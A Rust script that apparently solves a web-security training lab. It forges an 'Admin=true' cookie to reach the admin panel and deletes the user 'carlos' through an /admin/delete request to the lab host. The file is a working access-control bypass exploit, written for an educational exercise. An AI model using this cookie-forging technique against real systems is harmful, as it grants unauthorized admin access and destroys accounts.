/*****************************************************************
*
* Lab: User role controlled by request parameter
*
* Hack Steps: 
*      1. Add the cookie 'Admin' and set it to 'true'
*      2. Delete carlos from the admin panel
*
******************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7c00b5049874ac80087126004900a1.web-security-academy.net";

fn main() {
    print!(
        "❯❯ Deleting carlos from the admin panel after setting the 'Admin' cookie to true.. "
    );
    io::stdout().flush().unwrap();

    let web_client = build_web_client();
    web_client
        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
        .header("Cookie", format!("Admin=true"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to delete carlos".red()));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
